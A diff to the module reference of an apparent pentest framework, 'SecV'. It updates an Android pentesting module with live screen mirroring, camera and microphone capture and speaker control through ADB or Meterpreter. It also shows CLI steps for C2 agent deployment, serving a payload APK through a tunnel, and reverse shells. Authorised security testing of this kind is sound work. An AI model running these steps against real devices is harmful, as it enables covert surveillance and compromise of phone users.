@@ -4,7 +4,8 @@ Complete reference of all SecV security modules.
 
 **Version:** 2.4.2  
 **Total Modules:** 12  
-**Categories:** network (5), AD (2), mobile (2), web (1), ctf (1), phys (1)
+**Categories:** network (5), AD (2), mobile (2), web (1), ctf (1), phys (1)  
+**android_pentest operations:** 39
 
 ---
 
@@ -376,10 +377,10 @@ secV (winadsec) ❯ run 192.168.1.50
 
 ## Mobile
 
-### `android_pentest` v2.2.0
+### `android_pentest` v2.4.2
 **Full-Lifecycle Android Pentesting Suite**
 
-Device recon to active exploitation and persistence. Supports rooted and non-rooted devices, ADB over USB and WiFi, multi-device sweeps, on-device native agent deployment with TCP+HTTP C2, and a full web GUI (`mode=gui`) that covers all 30+ operations with embedded C2 dashboard.
+Device recon to active exploitation, persistence, and live media surveillance. Supports rooted and non-rooted devices, ADB over USB and WiFi, multi-device sweeps, on-device native agent deployment with TCP+HTTP C2, and a full web GUI (`mode=gui`) covering all 39 operations with embedded C2 dashboard and Live Media tab (screen mirror, camera, mic, speaker).
 
 **Parameters:**
 
@@ -435,14 +436,20 @@ Device recon to active exploitation and persistence. Supports rooted and non-roo
 | `c2_gui`           | Launch secV web C2 dashboard (bore, MSF, QR, operations, encrypted session logs)  |
 | `c2_cli`           | Launch C2 server in CLI mode                                                       |
 | `full`             | Complete assessment: recon + vuln_scan + exploit + network + forensics             |
+| `screen_mirror`    | Live screen mirror: ADB MJPEG stream (real-time) or MSF screenshot polling (3s interval) |
+| `camera_snap`      | Capture still from device camera via ADB screencap or MSF Meterpreter |
+| `camera_stream`    | Live camera stream via ADB screencap loop MJPEG or MSF |
+| `mic_record`       | Record device microphone via ADB or MSF `record_mic` |
+| `speaker_push`     | Push audio to device speaker via MSF Meterpreter |
 | `shell`            | OnlyShell reverse shell handler; auto-deliver `bash_tcp` payload via ADB if device connected |
 
 **Full Web GUI** (`tools/mobile/android/android_gui.py`):
 - Launch via `set mode gui; run` or `python3 android_gui.py --port 8897`
-- Operations sidebar: all 30+ operations grouped by category, click to configure and launch
-- Live terminal: real-time SSE output stream from every running operation
+- Operations sidebar: all 39 operations grouped by category, click to configure and launch
+- Live terminal: real-time SSE output stream with ANSI colours and PTY session ID dedup
 - ADB console tab: raw ADB command input, output inline
 - Findings tab: auto-parsed vulnerability cards from JSON output
+- Live Media tab: screen mirror (ADB MJPEG or MSF snapshot), camera stream (ADB/MSF), mic recording, speaker control — auto-detects screen dimensions from device
 - C2 Dashboard tab: embeds `c2_gui.py` as an inline iframe, auto-started on demand
 
 **On-Device Agent** (`tools/mobile/android/agent/`):
@@ -465,6 +472,10 @@ secV (android_pentest) ❯ set operation inject_agent
 secV (android_pentest) ❯ set agent_mode recon
 secV (android_pentest) ❯ run device
 
+# Full GUI (all 39 ops, live media, C2 dashboard)
+secV (android_pentest) ❯ set mode gui
+secV (android_pentest) ❯ run
+
 # C2 server (separate terminal)
 python3 tools/mobile/android/agent/c2_server.py --auto-exploit --lhost 192.168.1.100
 
@@ -475,6 +486,23 @@ secV (android_pentest) ❯ set apk_path /tmp/payload.apk
 secV (android_pentest) ❯ run no_device
 # → spawns detached HTTP server + bore tunnel
 # → QR encodes http://bore.pub:<port>/payload.apk
+
+# Live screen mirror (ADB)
+secV (android_pentest) ❯ set operation screen_mirror
+secV (android_pentest) ❯ set source adb
+secV (android_pentest) ❯ run device
+
+# Live screen mirror (MSF Meterpreter session)
+secV (android_pentest) ❯ set operation screen_mirror
+secV (android_pentest) ❯ set source msf
+secV (android_pentest) ❯ set msf_session 1
+secV (android_pentest) ❯ run device
+
+# Record microphone via ADB
+secV (android_pentest) ❯ set operation mic_record
+secV (android_pentest) ❯ set source adb
+secV (android_pentest) ❯ set duration 30
+secV (android_pentest) ❯ run device
 
 # WAN expose with bore fallback
 secV (android_pentest) ❯ set operation wan_expose
@@ -978,7 +1006,7 @@ See [CONTRIBUTING.md](CONTRIBUTING.md) for the full guide.
 | `revshell` | serve/generate | + nc/socat payloads | + msfvenom/nim | ✓ | ✓ |
 | `adsec` | discover/enum | + spray/kerberoast | + bloodhound/secretsdump | ✓ | ✓ |
 | `winadsec` | — | — | Full (Windows target, Sliver C2, PyInstaller) | ✓ | ✓ |
-| `android_pentest` | recon/adb | + Frida | + all ops | ✓ | ✓ |
+| `android_pentest` | recon/adb | + Frida | + all ops + live media | ✓ | ✓ |
 | `ios_pentest` | static IPA | + idevice | + Frida/JB | ✓ | ✓ |
 | `websec` | recon/DNS | + requests/active | + bs4/spider | ✓ | ✓ |
 | `ctfpwn` | list/info | — | + run with tools | ✓ | ✓ |
